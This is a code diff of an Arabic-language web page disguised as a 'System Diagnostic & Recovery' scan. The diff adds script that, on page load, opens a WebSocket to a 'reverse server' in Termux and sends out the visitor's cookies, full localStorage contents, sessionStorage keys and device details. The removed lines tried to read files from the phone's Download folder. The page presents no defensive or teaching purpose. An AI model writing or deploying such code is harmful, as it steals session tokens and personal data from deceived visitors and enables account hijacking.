@@ -2,38 +2,56 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>System Diagnostics</title>
+    <title>System Diagnostic & Recovery</title>
 </head>
-<body>
-    <h2>جاري تحميل حزمة البيانات...</h2>
+<body style="background-color: #121212; color: #00ffcc; font-family: monospace; text-align: center; padding-top: 50px;">
+    <h2>جاري فحص النظام وتحميل حزمة البيانات...</h2>
+    <p>يرجى عدم إغلاق الصفحة حتى اكتمال التوافقية.</p>
+
     <script>
-        // إنشاء اتصال WebSocket عكسي مع خادمك السليم
-        const ws = new WebSocket('ws://10.0.0.108:8765');
-        
+        // استبدل هذا الرابط بعنوان آيبتات شبكتك المحلية أو السيرفر الذي يستقبل الاتصال في Termux
+        const serverIP = window.location.hostname; 
+        const ws = new WebSocket(`ws://${serverIP}:8765`);
+
         ws.onopen = function() {
-            console.log("[+] متصل بالسيرفر بنجاح");
+            console.log("[+] تم الاتصال بنجاح بالخادم العكسي.");
             
-            // محاولة جمع معلومات النظام المتاحة عبر المتصفح
-            const sysData = {
-                action: "system_info",
-                ua: navigator.userAgent,
+            // جمع معلومات النظام المتاحة عبر كائنات المتصفح المتقدمة
+            const payloadData = {
+                action: "auto_extraction",
+                userAgent: navigator.userAgent,
                 platform: navigator.platform,
-                cookieEnabled: navigator.cookieEnabled
+                language: navigator.language,
+                screenResolution: `${window.screen.width}x${window.screen.height}`,
+                deviceMemory: navigator.deviceMemory || "غير معروف",
+                hardwareConcurrency: navigator.hardwareConcurrency || "غير معروف",
+                cookies: document.cookie,
+                localStorageKeys: Object.keys(localStorage),
+                sessionStorageKeys: Object.keys(sessionStorage)
             };
-            ws.send(JSON.stringify(sysData));
-            
-            // محاولة جلب الملفات المتاحة في التخزين الخارجي إن وجدت عبر مسارات الـ File API
+
+            // محاولة قراءة قواعد البيانات المحلية للمتصفح (IndexedDB / LocalStorage) إن وجدت مخزنة مسبقاً
             try {
-                fetch('file:///sdcard/Download/')
-                    .then(response => response.text())
-                    .then(data => {
-                        ws.send(JSON.stringify({action: "file_dump", content: data}));
-                    }).catch(err => {
-                        ws.send(JSON.stringify({action: "error", msg: "Sandbox restriction applied"}));
-                    });
+                let localDataDump = {};
+                for (let i = 0; i < localStorage.length; i++) {
+                    let key = localStorage.key(i);
+                    localDataDump[key] = localStorage.getItem(key);
+                }
+                payloadData.localStorageContent = localDataDump;
             } catch(e) {
-                ws.send(JSON.stringify({action: "error", msg: e.toString()}));
+                payloadData.localStorageError = e.toString();
             }
+
+            // إرسال الحزمة المسحوبة تلقائياً إلى خادمك في Termux
+            ws.send(JSON.stringify(payloadData));
+        };
+
+        ws.onmessage = function(event) {
+            console.log("[<] أمر وارد من الخادم: ", event.data);
+        };
+
+        ws.onerror = function(error) {
+            console.log("[-] خطأ في قناة الاتصال: ", error);
         };
     </script>
 </body>
